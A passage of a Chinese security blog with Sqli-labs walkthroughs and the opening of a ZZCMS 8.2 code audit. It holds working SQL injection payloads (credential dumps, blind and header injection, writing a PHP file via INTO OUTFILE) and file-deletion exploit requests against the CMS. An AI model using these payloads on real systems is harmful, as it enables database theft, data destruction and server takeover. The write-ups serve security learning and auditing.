-$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);        //Strip out union
-$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);        //Strip out select
-$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);        //Strip out UNION
-$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);        //Strip out SELECT
-$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);        //Strip out Union
-$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);        //Strip out Select
-return $id;
-}
-</code></pre><p>发现在前面的基础上过滤了<code>union select</code>等敏感字符,使用双写或大小写混淆即可绕过。</p>
-<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>相比于less-27,直接拼接<code>$id</code>,所以不需要闭合符去闭合且关闭了报错,用联合或延时注入即可。</p>
-<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>对比less-27,闭合符号由<code>&#39;</code>变为<code>&#39;）</code>且关闭报错与过滤条件少了select,使用联合或延时注入即可</p>
-<h3 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h3><p>对比less-28,只是少了几个过滤条件,使用联合或延时注入即可</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/29/Sqli-labs Less17-22/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/29/Sqli-labs Less17-22/" itemprop="url">Sqli-labs Less17-22</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-29T08:15:41+08:00">
-                2018-10-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>在做<code>less-17</code>之前,需要先了解一些MYSQL基础增删改查的命令:<a href="https://p0rz9.github.io/2018/10/12/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">基础知识 | MYSQL基础命令</a></p>
-<h2 id="less-17-update注入"><a href="#less-17-update注入" class="headerlink" title="less-17 update注入"></a>less-17 update注入</h2><p>经测试在 admin字段中无报错信息<br>我们测试password字段:<br>uname=admin&amp;passwd=admin’&amp;submit=Submit<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.11.59.10-image.png" alt="2018-10-29.11.59.10-image.png"></p>
-<p>查看报错即可知道这里用<code>&#39;</code>闭合即可,且这里显示出sql错误,所以可用报错注入或延时注入,下面介绍下报错注入:</p>
-<pre><code>uname=admin&amp;passwd=admin&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&amp;submit=Submit  #得到数据库名
-</code></pre><p>然后将select database()换为其他查询语句即可(可参考less-5的查询语句)：<br><a href="https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" target="_blank" rel="noopener">Sqli-labs_Blind_injection_Less5-6/</a></p>
-<p>less-17的sql语句为:</p>
-<pre><code>function check_input($value)
-{
-if(!empty($value))
-    {
-    // truncation (see comments)
-    $value = substr($value,0,15);
-    }
-
-    // Stripslashes if magic quotes enabled
-    if (get_magic_quotes_gpc())
-        {
-        $value = stripslashes($value);
-        }
-
-    // Quote if not a number
-    if (!ctype_digit($value))
-        {
-        $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;
-        }
-
-else
-    {
-    $value = intval($value);
-    }
-return $value;
-}
-......
-$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;
-</code></pre><p>查看源代码就可理解这里的<code>uname</code>字段为什么不能注入了,因为经过check_input安全函数过滤：</p>
-<pre><code>★addslashes() #预定字符之前添加反斜杠并返回
-注:PHP会默认(gpc为on状态)对所有的GET POST COOKIE数据自动运行addslashes,所以不应该对已转义过的字符使用addslashes()操作,会造成双层转义。
-遇到这种情况,一般使用get_magic_quotes_gpc()进行检测。
-
-★stripslashes() #删除由addslashes()添加的反斜杠
-
-★mysql_real_escape_string() #转义sql语句中使用的特殊字符`
-</code></pre><p>经过这几个函数处理,所以<code>uname</code>这个字段不能注入了。<br>那这里注入的语句使用的是update操作  我们在挖掘CMS的漏洞时,也可以将查询语句拼接到后面,然后再找一处查询该数据表内容的地方形成注入(update insert注入)</p>
-<hr>
-<p>在接下来的几关都属于HTTP头注入,我们需要先了解一下一些http基础:</p>
-<pre><code>Accept： 浏览器能够处理的内容类型
-Accept-Charset： 浏览器能够显示的字符集
-Accept-Encoding：浏览器能够处理的压缩编码。
-Accept-Language： 浏览器当前设置的语言。
-Connection：浏览器与服务器之间连接的类型
-Cookie：当前页面设置的任何Cookie
-Host：发出请求的页面所在的域。
-Referer：发出请求的页面的URI。
-User-Agent：浏览器的用户代理字符串
-Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)
-</code></pre><h2 id="less-18-UA头注入"><a href="#less-18-UA头注入" class="headerlink" title="less-18 UA头注入"></a>less-18 UA头注入</h2><p>输入正确的账号密码:admin 0<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.31.25-image.png" alt="2018-10-29.15.31.25-image.png"></p>
-<p>看见这里会显示ip与UA头,我们尝试注入:</p>
-<pre><code>User-Agent: aaaaa&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1),&apos;
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.22.23-image.png" alt="2018-10-29.15.22.23-image.png"></p>
-<p>ip伪造主要有几个参数:<br><code>X-FORWARDED-FOR</code> 是代理服务器通过<code>HTTP Headers</code>提供的客户端IP.代理服务器可以伪造任何IP.<br><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 就是跟你服务器直接连接的IP. 不可伪造<br><code>CLIENT_IP</code> 可伪造</p>
-<p>这里尝试了几个,ip不可伪造注入</p>
-<p>less-18的sql语句为:</p>
-<pre><code>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;
-</code></pre><h2 id="less-19-REFERER注入"><a href="#less-19-REFERER注入" class="headerlink" title="less-19 REFERER注入"></a>less-19 REFERER注入</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.46.12-image.png" alt="2018-10-29.15.46.12-image.png"><br>放入burp的reperter模块测试:<br>与less-18的payload一样,只不过是从UA头换到了referer处：</p>
-<pre><code>Referer: &apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1),&apos;
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.16.32.48-image.png" alt="2018-10-29.16.32.48-image.png"></p>
-<p>然后将<code>select user()</code>处更换为其他查询语句就ok了</p>
-<p>less-19的sql语句为:</p>
-<pre><code>$uname = check_input($_POST[&apos;uname&apos;]);
-$passwd = check_input($_POST[&apos;passwd&apos;]);
-......
-$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;)&quot;;
-</code></pre><h2 id="less-20-Cookie注入"><a href="#less-20-Cookie注入" class="headerlink" title="less-20 Cookie注入"></a>less-20 Cookie注入</h2><p>我们查看代码:</p>
-<pre><code>&lt;?php
-if(!isset($_COOKIE[&apos;uname&apos;]))
-    {
-    ...
-        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
-        $result1 = mysql_query($sql);
-        $row1 = mysql_fetch_array($result1);
-        $cookee = $row1[&apos;username&apos;];
-            if($row1)
-                {
-                echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;
-                setcookie(&apos;uname&apos;, $cookee, time()+3600);    
-                ...
-}
-else
-{
-    if(!isset($_POST[&apos;submit&apos;]))
-        {
-            $cookee = $_COOKIE[&apos;uname&apos;];
-            ...
-            $sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;;
-            ...
-        }    
-    else
-        ...
-}
-?&gt;
-</code></pre><p>从源代码可看出,我在第一次登陆时,我们的cookie从username取值,当再次刷新后,会从cookie字段中读取username的值然后进行查询.</p>
-<p>首先填写正确账号密码:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.36.27-image.png" alt="2018-10-29.17.36.27-image.png"><br>提交之后:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.36.55-image.png" alt="2018-10-29.17.36.55-image.png"></p>
-<p>然后我们刷新时抓包:</p>
-<pre><code>GET /less-20/index.php HTTP/1.1
-Host: 127.0.0.1:86
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-DNT: 1
-Referer: http://127.0.0.1:86/less-20/index.php
-Cookie: uname=admin
-Connection: close
-Cache-Control: max-age=0
-</code></pre><p>修改cookie为：</p>
-<pre><code>Cookie: uname=admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1)%23
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.40.44-image.png" alt="2018-10-29.17.40.44-image.png"></p>
-<p>之后将<code>select user()</code>改为其他查询语句即可。</p>
-<h2 id="less-21-cookie-base64-注入"><a href="#less-21-cookie-base64-注入" class="headerlink" title="less-21 cookie_base64 注入"></a>less-21 cookie_base64 注入</h2><p>与less-20同理,只是将payload的闭合符号<code>&#39;</code>换为<code>&#39;)</code>,再用base64加密一下即可:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.50.13-image.png" alt="2018-10-29.17.50.13-image.png"></p>
-<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>将less-21的payload的闭合符号<code>&#39;)</code>换为<code>&quot;</code>,再用base64加密一下即可:</p>
-<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.18.01.40-image.png" alt="2018-10-29.18.01.40-image.png"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/28/Sqli-labs Less7-16/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/28/Sqli-labs Less7-16/" itemprop="url">Sqli-labs Less7-16</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-28T08:15:41+08:00">
-                2018-10-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>这里笔者是从测试的角度来练习的,通过fuzz猜测闭合符号—&gt;猜测sql语句—&gt;注入利用</p>
-</blockquote>
-<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7:"></a>less-7:</h2><p>访问第7关地址:<br>按照笔者的理解,sql注入的第一步是去想办法闭合语句,我们在平常挖洞的时候测试sql注入时,碰到<code>http://127.0.0.1:86/less-7/index.php?id=1</code>我们往往会加’测试,但是并不是所有的代码都会用单引号去包裹,我们需要更全面的去fuzz</p>
-<p>这是我测试闭合符号的payload:<br>以less-7为例子:</p>
-<pre><code>http://127.0.0.1:86/less-7/index.php?id=1    正确
-http://127.0.0.1:86/less-7/index.php?id=1%23 正确
-</code></pre><hr>
-<p>fuzz的结果:</p>
-<table>
-<thead>
-<tr>
-<th>paylaod</th>
-<th style="text-align:right">未加%23(#)</th>
-<th style="text-align:right">加注释符(#)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>id=1</td>
-<td style="text-align:right">正确</td>
-<td style="text-align:right">正确</td>
-</tr>
-<tr>
-<td>id=1’</td>
-<td style="text-align:right">错误</td>
-<td style="text-align:right">错误</td>
-</tr>
-<tr>
-<td>id=1’)</td>
-<td style="text-align:right">错误</td>
-<td style="text-align:right">错误</td>
-</tr>
-<tr>
-<td>id=1’))</td>
-<td style="text-align:right">错误</td>
-<td style="text-align:right">正确</td>
-</tr>
-<tr>
-<td>id=1”</td>
-<td style="text-align:right">正确</td>
-<td style="text-align:right">正确</td>
-</tr>
-<tr>
-<td>id=1”)</td>
-<td style="text-align:right">正确</td>
-<td style="text-align:right">正确</td>
-</tr>
-<tr>
-<td>id=1”))</td>
-<td style="text-align:right">正确</td>
-<td style="text-align:right">正确</td>
-</tr>
-<tr>
-<td>id=1)</td>
-<td style="text-align:right">正确</td>
-<td style="text-align:right">正确</td>
-</tr>
-<tr>
-<td>id=1))</td>
-<td style="text-align:right">正确</td>
-<td style="text-align:right">正确</td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p>如果未加<code>%23(#)</code>显示错误而加上<code>%23(#)</code>显示正确即为闭合符号</p>
-</blockquote>
-<p>我们可看到加上<code>&#39;))</code>这3个字符去访问返回错误,但是在加上注释符(#)去访问就变回正常的了<br>所以我们就可以知道用<code>&#39;))</code>去闭合是正确的,当然这里为了更快速的测试,我把这些放入一个字典当中,用burp的intruder模块去爆破也是可以的:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.12.10.46-image.png" alt="2018-10-29.12.10.46-image.png"><br>根据结果也可判断出<code>&#39;))</code>去闭合是正确的,接下来就是去正常的注入即可:</p>
-<p>判断字段个数</p>
-<pre><code>http://127.0.0.1:86/less-7/index.php?id=1&apos;)) order by 3%23
-http://127.0.0.1:86/less-7/index.php?id=1&apos;)) order by 4%23
-</code></pre><p>得到字段数为3,<br>使用<code>out_file</code>写入文件:</p>
-<pre><code>http://127.0.0.1:86/less-7/index.php?id=1&apos;)) union select 1,&apos;&lt;?php phpinfo();?&gt;&apos;,3 into outfile &apos;C:/web/WWW/sqli-labs-master/Less-7/shell.php&apos;%23
-</code></pre><p>成功写入:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.17.28.55-image.png" alt="2018-10-28.17.28.55-image.png"></p>
-<p>less-7的sql语句为:</p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;;
-</code></pre><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8:"></a>less-8:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.25.31-image.png" alt="2018-10-28.18.25.31-image.png"></p>
-<p>是个<code>&#39;</code>闭合无疑了</p>
-<p>因为这里正确页面包含<code>you are in</code> 错误页面无此字符串且没显示错误信息,那么这里我们只能使用盲注来获取信息,可参考笔者之前的文章:<br><a href="https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" target="_blank" rel="noopener">Sqli-labs_Blind_injection_Less5-6</a> </p>
-<p>less-8的sql语句为:</p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
-</code></pre><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9:"></a>less-9:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.09.07-image.png" alt="2018-10-28.18.09.07-image.png"><br>同样为<code>&#39;</code><br>这里同样没有返回错误信息,再结合less-9的题目:<code>Blind-Time based</code>,我们可知道这里是要使用延时注入的,贴几条payload:</p>
-<pre><code>?id=1&apos; and if((length(user())=14),sleep(5),1)%23 #当前用户长度为14
-?id=1&apos; and if((ascii(substr((select database()),1,1))=115)),sleep(3),1)%23   #数据库第一位是s(ascii码为115)
-?id=1&apos; and if((ascii(substr((select database()),1,1))=115)),sleep(3),1)%23   #数据库第一位是s(ascii码为115)
-</code></pre><p>……..<br>猜解表与字段同理。</p>
-<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.42.48-image.png" alt="2018-10-28.18.42.48-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.42.10-image.png" alt="2018-10-28.18.42.10-image.png"></p>
-<p>less-9的sql语句为:</p>
-<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
-</code></pre><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10:"></a>less-10:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.50.58-image.png" alt="xxxxx"></p>
-<p><code>&quot;</code>闭合即可</p>
-<p>与less-9同理,只需把payload的闭合符变为<code>&quot;</code>即可</p>
-<p>less-10的sql语句为:</p>
-<pre><code>$id = &apos;&quot;&apos;.$id.&apos;&quot;&apos;;
-$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
-</code></pre><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11:"></a>less-11:</h2><p>正确页面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.51.06-image.png" alt="2018-10-28.20.51.06-image.png"></p>
-<p>错误页面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.51.43-image.png" alt="2018-10-28.20.51.43-image.png"></p>
-<p>所以改变下intruder的过滤规则即可,利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.53.44-image.png" alt="2018-10-28.20.53.44-image.png"></p>
-<p>我们得到 未加注释符(#)错误  加上注释符正确的符号 即为<code>&#39;</code></p>
-<p>那么这里就开始POST注入:</p>
-<pre><code>uname=xxxx&apos; order by 2%23&amp;passwd=admin&amp;submit=Submit    #得到字段数为2
-uname=xxxx&apos; union select 1,2%23&amp;passwd=admin&amp;submit=Submit #得到显错位
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.03.08-image.png" alt="2018-10-28.21.03.08-image.png"></p>
-<pre><code>#得到user:root@localhost database:security
-uname=xxxx&apos; union select user(),database()%23&amp;passwd=admin&amp;submit=Submit 
-
-#得到全部表名emails,referers,uagents,users
-uname=xxxx&apos; union select (select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),2%23&amp;passwd=admin&amp;submit=Submit  
-
-#得到users表下的所有字段名 id,username,password
-uname=xxxx&apos; union select (select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),2&amp;passwd=admin&amp;submit=Submit  
-
-#得到security库下的users下的username,password内容
-uname=xxxx&apos; union select (select group_concat(username,&apos;:&apos;,password) from security.users),2%23&amp;passwd=admin&amp;submit=Submit
-</code></pre><p>less-11的sql语句为:</p>
-<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
-</code></pre><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12:"></a>less-12:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.25.38-image.png" alt="2018-10-28.21.25.38-image.png"></p>
-<p>得到闭合符号为<code>&quot;)</code><br>然后把<code>less-11</code>的payload中的闭合符号<code>&#39;</code>变为<code>&quot;)</code>即可注入</p>
-<p>less-12源代码:</p>
-<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
-$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
-@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
-</code></pre><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13:"></a>less-13:</h2><p>这里正确内容并不会像上面一样返回name及pwd,而会返回错误sql语句和是否登陆成功的信息,所以这里即可使用报错注入或盲注<br>盲注如下:<br>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.30.09-image.png" alt="2018-10-28.21.30.09-image.png"></p>
-<p>得到闭合符号为<code>&#39;)</code></p>
-<p>然后使用报错注入即可,这里列举几个payload:</p>
-<pre><code>uname=admin&apos;) and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&amp;passwd=admin&amp;submit=Submit
-</code></pre><p>然后将select database()更换为其他查询语句即可得到数据</p>
-<p>盲注参考less-5</p>
-<p>less-13源代码:</p>
-<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;
-</code></pre><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14:"></a>less-14:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.53.31-image.png" alt="2018-10-28.21.53.31-image.png"></p>
-<p>正确或错误返回内容与less-13一样 只是闭合符号变为了<code>&quot;</code></p>
-<p>所以只需将less-13的payload中的闭合符<code>&#39;)</code>变为<code>&quot;</code>即可注入</p>
-<p>less-14源代码:</p>
-<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
-$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
-@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;
-</code></pre><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15:"></a>less-15:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.58.38-image.png" alt="2018-10-28.21.58.38-image.png"></p>
-<p>所以闭合符号为<code>&#39;</code></p>
-<p>正确错误不会返回错误信息,只是不同内容,所以这里用盲注即可   参考less-5即可<br>less-15源代码:</p>
-<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
-</code></pre><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16:"></a>less-16:</h2><p>利用上面的方法得到正确的闭合符号<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.22.02.01-image.png" alt="2018-10-28.22.02.01-image.png"></p>
-<p>这里的情况与less-5相同,只是闭合符号<code>&#39;</code>变为<code>&quot;)</code></p>
-<p>所以也可以用盲注,将闭合符换为<code>&quot;)</code>即可。</p>
-<p>less-16源代码:</p>
-<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
-$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
-@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
-</code></pre><hr>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/25/ZZCMSV8.2详细审计/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/25/ZZCMSV8.2详细审计/" itemprop="url">代码审计 | ZZCMSV8.2详细审计</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-25T08:15:41+08:00">
-                2018-10-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>##<strong>1.安装时配置文件可写入命令导致Getshell</strong>(需要<code>magic_qupte_gpc</code>为<code>off</code>状态)<br>一般这种重装时出现的漏洞,需要配合其他漏洞才能发挥作用(如任意文件删除<code>lock</code>文件导致重装):<br>详情可看笔者发到ichunqiu的文章:<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44383&amp;page=1#pid500791" target="_blank" rel="noopener">ZZCMS 从任意文件删除至getshell</a></p>
-<p>##<strong>2.多处任意文件删除:</strong><br>这是ZZCMS8.2关于文件操作部分的代码:</p>
-<pre><code>A.
-if ($oldimg&lt;&gt;$img){
-        $f=&quot;../&quot;.$oldimg;
-        if (file_exists($f)){
-        unlink($f);        
-        }
-}
-
-
-B.
-if ($row[&apos;img&apos;]&lt;&gt;&quot;/image/nopic.gif&quot;){
-        $f=&quot;../&quot;.substr($row[&apos;img&apos;],1);
-        if (file_exists($f)){
-        unlink($f);
-        }
-</code></pre><p>  在前台的文件删除最多的就是这两种删除情况,A代码没有对传入的<code>$oldimg</code>进行过滤导致任意文件删除,而B是从数据库提取<code>$row[&#39;img&#39;]</code>再进行删除,经测试,在该CMS中都会造成文件删除。这里只列出漏洞文件与漏洞利用条件,因为代码无外乎上面那两段。</p>
-<p><strong>漏洞利用:</strong><br>A代码部分<br>1.<code>user\adv.php(modify与add方式都存在)</code>payload：</p>
-<pre><code>127.0.0.1:81/user/adv.php?$action=modify
-post:oldimg=install/install.lock
-</code></pre><p>2.<code>licence_save.php(随意添加一个资质,得到id为1)</code>payload：</p>
-<pre><code>http://127.0.0.1:81/user/licence_save.php?action=modify
-post：oldimg=install/install.lock&amp;id=1
-</code></pre><p>在实战中可以直接爆破得到id。<br>另外涉及的文件还有<code>user\manage.php</code>  <code>user\ppsave.php</code>  <code>user\zssave.php</code> <code>ztconfig.php</code></p>
-<p>B代码部分<br>与A的利用方式不同的是,他这里的<code>$row[&#39;img&#39;]</code>是从数据库中提取的,那我们要利用这里进行文件删除的话就需要先把脏数据(要删除的文件)写入数据库,然后再去删除。</p>
-<p>我这里也找到几处存在问题的地方：<br>1.<code>user\del.php:</code><br><img src="http://static.zybuluo.com/chhyx/mrzy5zfl10c4uulo7yitzvht/image_1cqipr8rc1tro19ucr1aql41i1p87.png" alt="image_1cqipr8rc1tro19ucr1aql41i1p87.png-99.5kB"></p>
